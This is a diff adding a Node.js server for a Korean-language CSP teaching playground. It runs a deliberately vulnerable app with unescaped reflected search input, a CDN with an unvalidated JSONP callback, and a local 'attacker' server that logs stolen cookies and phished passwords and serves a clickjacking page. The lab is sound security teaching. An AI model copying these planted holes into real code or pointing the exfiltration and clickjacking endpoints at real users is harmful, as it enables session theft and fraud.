@@ -1,0 +1,313 @@
+// 의존성 0개. `node playground/server.mjs` 하나로 세 개의 origin을 띄운다.
+//   :3000  우리 앱 (취약한 페이지 + 랩별 CSP)
+//   :3001  "신뢰하는" 서드파티 CDN (allowlist 대상, JSONP 엔드포인트 보유)
+//   :4000  공격자 서버 (탈취한 데이터 대시보드)
+import { randomBytes } from "node:crypto";
+import { readFile } from "node:fs/promises";
+import { createServer } from "node:http";
+import { extname, join } from "node:path";
+import { fileURLToPath } from "node:url";
+
+import { ATTACKS, LABS, ORIGINS, buildPolicyHeader } from "./labs.mjs";
+
+const HERE = fileURLToPath(new URL(".", import.meta.url));
+const MIME = { ".js": "text/javascript; charset=utf-8", ".css": "text/css; charset=utf-8" };
+
+const escapeHtml = (text) =>
+  String(text)
+    .replaceAll("&", "&amp;")
+    .replaceAll("<", "&lt;")
+    .replaceAll(">", "&gt;")
+    .replaceAll('"', "&quot;");
+
+const send = (response, status, body, headers = {}) => {
+  response.writeHead(status, { "Content-Type": "text/html; charset=utf-8", ...headers });
+  response.end(body);
+};
+
+const readBody = (request) =>
+  new Promise((resolve) => {
+    let body = "";
+    request.on("data", (chunk) => (body += chunk));
+    request.on("end", () => resolve(body));
+  });
+
+const serveFile = async (response, path, headers = {}) => {
+  try {
+    const content = await readFile(path);
+    response.writeHead(200, {
+      "Content-Type": MIME[extname(path)] ?? "application/octet-stream",
+      "Cache-Control": "no-store",
+      ...headers,
+    });
+    response.end(content);
+  } catch {
+    send(response, 404, "not found");
+  }
+};
+
+// ─────────────────────────────── :3000 우리 앱 ───────────────────────────────
+
+const violationReports = [];
+
+const layout = ({ title, nonce, head = "", body }) => `<!doctype html>
+<html lang="ko">
+<head>
+<meta charset="utf-8">
+<title>${escapeHtml(title)}</title>
+<link rel="stylesheet" href="/static/style.css">
+<script src="/static/devtools.js" nonce="${nonce}"></script>
+${head}
+</head>
+<body>${body}</body>
+</html>`;
+
+const renderIndex = () =>
+  layout({
+    title: "CSP Playground",
+    nonce: "",
+    body: `<main>
+<h1>CSP Playground</h1>
+<p>같은 취약한 페이지에 CSP만 바꿔 가며 공격이 어떻게 막히는지 본다.
+옆 창에 <a href="${ORIGINS.attacker}" target="_blank">공격자 대시보드 (:4000)</a>를 띄워 두자.</p>
+<ol class="labs">${LABS.map(
+      (lab) => `<li><a href="/lab/${lab.id}">${escapeHtml(lab.title)}</a><p>${escapeHtml(lab.summary)}</p></li>`,
+    ).join("")}</ol>
+<p><a href="/violations">수집된 위반 리포트 (Lab 8)</a></p>
+</main>`,
+  });
+
+const renderLab = (lab, query) => {
+  const nonce = lab.nonce?.(query) ?? randomBytes(16).toString("base64");
+  const policy = buildPolicyHeader(lab, { nonce, query });
+  const searchTerm = query.get("q") ?? "";
+
+  const toggles = (lab.toggles ?? [])
+    .map((toggle) => {
+      const next = new URLSearchParams(query);
+      const isOn = query.get(toggle.key) === "1";
+      if (isOn) next.delete(toggle.key);
+      else next.set(toggle.key, "1");
+      return `<a class="toggle ${isOn ? "on" : ""}" href="?${escapeHtml(next)}">${isOn ? "☑" : "☐"} ${escapeHtml(toggle.label)}</a>`;
+    })
+    .join("");
+
+  const attacks = lab.attacks
+    .map((key) => {
+      const attack = ATTACKS[key];
+      const next = new URLSearchParams(query);
+      next.set("q", attack.payload);
+      return `<li><a href="?${escapeHtml(next)}">${escapeHtml(attack.label)}</a><code>${escapeHtml(attack.payload)}</code></li>`;
+    })
+    .join("");
+
+  const legitInline = lab.legitInline
+    ? `<script nonce="${nonce}">lab.log("ok", "nonce가 붙은 우리 인라인 스크립트 실행됨");</script>`
+    : "";
+  const legitScripts = (lab.legitScripts ?? [])
+    .map((src) => `<script src="${src}${src.includes("schema-lib") ? `?jitless=${query.get("jitless") ?? "0"}` : ""}" nonce="${nonce}"></script>`)
+    .join("");
+  const legitAfterContent = (lab.legitScriptsAfterContent ?? [])
+    .map((src) => `<script src="${src}" nonce="${nonce}"></script>`)
+    .join("");
+
+  const clickjack = lab.clickjack
+    ? `<p class="hint">공격자 페이지에서 이 화면을 iframe으로 덮어 본다:
+<a href="${ORIGINS.attacker}/clickjack?fa=${query.get("fa") ?? "0"}" target="_blank">${ORIGINS.attacker}/clickjack</a></p>
+<form method="post" action="/transfer" class="bank"><b>송금</b> 공격자에게 1,000,000원 <button>송금하기</button></form>`
+    : "";
+
+  const policyBox = policy
+    ? `<pre class="header"><b>${escapeHtml(policy.name)}:</b>\n${escapeHtml(policy.value.replaceAll("; ", ";\n"))}</pre>`
+    : `<pre class="header"><b>CSP 헤더 없음</b></pre>`;
+
+  const html = layout({
+    title: lab.title,
+    nonce,
+    head: legitScripts,
+    body: `<main>
+<nav><a href="/">← 목록</a></nav>
+<h1>${escapeHtml(lab.title)}</h1>
+<p>${escapeHtml(lab.summary)}</p>
+<div class="toggles">${toggles}</div>
+${policyBox}
+${attacks ? `<h2>공격 페이로드 (클릭하면 ?q= 에 주입)</h2><ul class="attacks">${attacks}</ul>` : ""}
+${clickjack}
+<form class="search"><input name="q" value="${escapeHtml(searchTerm)}" placeholder="검색어">${[...query]
+      .filter(([key]) => key !== "q")
+      .map(([key, value]) => `<input type="hidden" name="${escapeHtml(key)}" value="${escapeHtml(value)}">`)
+      .join("")}<button>검색</button></form>
+<section class="result">
+<h2>검색 결과</h2>
+<!-- 취약점: 사용자 입력을 이스케이프 없이 그대로 출력한다 -->
+<div>"${searchTerm}" 에 대한 결과가 없습니다.</div>
+</section>
+${legitInline}
+${legitAfterContent}
+<h2>실행 로그</h2><ul id="lab-log"></ul>
+<h2>CSP 위반 (securitypolicyviolation 이벤트)</h2><ul id="lab-violations"></ul>
+</main>`,
+  });
+
+  return { html, policy };
+};
+
+const renderViolations = () =>
+  layout({
+    title: "Violation reports",
+    nonce: "",
+    head: `<meta http-equiv="refresh" content="2">`,
+    body: `<main><nav><a href="/">← 목록</a></nav>
+<h1>수집된 CSP 위반 리포트 (${violationReports.length}건)</h1>
+<p>브라우저가 <code>report-uri /csp-report</code> 로 POST 한 JSON. 2초마다 새로고침.</p>
+${violationReports
+  .slice()
+  .reverse()
+  .map((report) => `<pre class="header">${escapeHtml(JSON.stringify(report, null, 2))}</pre>`)
+  .join("")}
+</main>`,
+  });
+
+const appServer = createServer(async (request, response) => {
+  const url = new URL(request.url, ORIGINS.app);
+  const { pathname, searchParams } = url;
+
+  // 데모용: HttpOnly가 아닌 세션 쿠키. 탈취 대상이 눈에 보이도록.
+  const cookie = "session=demo-session-7f3a9c; Path=/; SameSite=Lax";
+
+  if (pathname === "/") {
+    return send(response, 200, renderIndex(), { "Set-Cookie": cookie });
+  }
+
+  const staticMatch = pathname.match(/^(?:\/lab)?\/static\/([\w.-]+)$/);
+  if (staticMatch) {
+    return serveFile(response, join(HERE, "static", staticMatch[1]));
+  }
+
+  const labMatch = pathname.match(/^\/lab\/([\w-]+)$/);
+  const lab = labMatch && LABS.find((candidate) => candidate.id === labMatch[1]);
+  if (lab) {
+    const { html, policy } = renderLab(lab, searchParams);
+    const headers = { "Set-Cookie": cookie, "Cache-Control": "no-store" };
+    if (policy) headers[policy.name] = policy.value;
+    return send(response, 200, html, headers);
+  }
+
+  if (pathname === "/csp-report" && request.method === "POST") {
+    const body = await readBody(request);
+    try {
+      const parsed = JSON.parse(body);
+      violationReports.push(parsed["csp-report"] ?? parsed);
+      const report = parsed["csp-report"] ?? {};
+      console.log(`[csp-report] ${report["violated-directive"]} ← ${report["blocked-uri"]}`);
+    } catch {
+      violationReports.push({ raw: body });
+    }
+    response.writeHead(204);
+    return response.end();
+  }
+
+  if (pathname === "/violations") {
+    return send(response, 200, renderViolations());
+  }
+
+  if (pathname === "/transfer" && request.method === "POST") {
+    return send(response, 200, `<h1>💸 송금 완료 (데모)</h1><p>클릭재킹에 당했다면 사용자는 이걸 누른 줄도 모른다.</p>`);
+  }
+
+  send(response, 404, "not found");
+});
+
+// ─────────────────────────── :3001 "신뢰하는" CDN ───────────────────────────
+
+const cdnServer = createServer((request, response) => {
+  const url = new URL(request.url, ORIGINS.cdn);
+
+  // 흔한 실수: callback 파라미터를 검증 없이 응답에 그대로 넣는 JSONP.
+  if (url.pathname === "/jsonp") {
+    const callback = url.searchParams.get("callback") ?? "callback";
+    response.writeHead(200, { "Content-Type": "text/javascript; charset=utf-8" });
+    return response.end(`${callback}({"weather":"sunny"})`);
+  }
+
+  if (url.pathname === "/analytics.js") {
+    return serveFile(response, join(HERE, "static", "third-party-analytics.js"));
+  }
+
+  send(response, 404, "not found");
+});
+
+// ───────────────────────────── :4000 공격자 서버 ─────────────────────────────
+
+const loot = [];
+
+const recordLoot = (via, data) => {
+  loot.push({ at: new Date().toLocaleTimeString("ko-KR"), via, data });
+  console.log(`[attacker] 💀 ${via}: ${data}`);
+};
+
+const attackerServer = createServer(async (request, response) => {
+  const url = new URL(request.url, ORIGINS.attacker);
+  const { pathname, searchParams } = url;
+
+  if (pathname === "/") {
+    return send(
+      response,
+      200,
+      `<!doctype html><meta charset="utf-8"><meta http-equiv="refresh" content="1">
+<title>attacker</title>
+<style>body{font:14px/1.5 ui-monospace,monospace;background:#1b0f12;color:#f4d7dc;padding:24px}td,th{padding:4px 12px;text-align:left;border-bottom:1px solid #4a2a31}</style>
+<h1>💀 공격자 대시보드 (:4000)</h1>
+<p>탈취 ${loot.length}건 — 1초마다 새로고침</p>
+<table><tr><th>시각</th><th>경로</th><th>데이터</th></tr>${loot
+        .slice()
+        .reverse()
+        .map((item) => `<tr><td>${item.at}</td><td>${escapeHtml(item.via)}</td><td>${escapeHtml(item.data)}</td></tr>`)
+        .join("")}</table>`,
+    );
+  }
+
+  if (pathname === "/steal") {
+    recordLoot(searchParams.get("via") ?? "unknown", searchParams.get("c") ?? "");
+    response.writeHead(204, { "Access-Control-Allow-Origin": "*" });
+    return response.end();
+  }
+
+  if (pathname === "/phish" && request.method === "POST") {
+    recordLoot("가짜 로그인 폼", await readBody(request));
+    return send(response, 200, "<h1>로그인 되었습니다 :)</h1><p>(비밀번호는 공격자에게 갔다)</p>");
+  }
+
+  if (pathname === "/evil.js") {
+    return serveFile(response, join(HERE, "attacker", "evil.js"));
+  }
+
+  if (pathname === "/static/widget.js") {
+    return serveFile(response, join(HERE, "attacker", "hijacked-widget.js"));
+  }
+
+  if (pathname === "/clickjack") {
+    const fa = searchParams.get("fa") === "1" ? "1" : "0";
+    return send(
+      response,
+      200,
+      `<!doctype html><meta charset="utf-8"><title>무료 경품</title>
+<style>
+body{font:16px sans-serif;padding:24px}
+.bait{position:absolute;top:400px;left:40px;padding:16px 32px;background:#ffcf33;font-weight:bold;border-radius:8px}
+iframe{position:absolute;top:0;left:0;width:100%;height:900px;border:0;opacity:var(--o,0.0001)}
+label{position:fixed;right:16px;top:16px;z-index:10;background:#fff}
+</style>
+<h1>🎁 축하합니다! 경품에 당첨되었습니다</h1>
+<div class="bait">경품 받기</div>
+<label><input type="checkbox" onchange="document.body.style.setProperty('--o', this.checked ? 0.5 : 0.0001)"> iframe 보이기</label>
+<iframe src="${ORIGINS.app}/lab/9-frame-ancestors?fa=${fa}"></iframe>`,
+    );
+  }
+
+  send(response, 404, "not found");
+});
+
+appServer.listen(3000, () => console.log(`앱        ${ORIGINS.app}`));
+cdnServer.listen(3001, () => console.log(`CDN       ${ORIGINS.cdn}`));
+attackerServer.listen(4000, () => console.log(`공격자    ${ORIGINS.attacker}`));
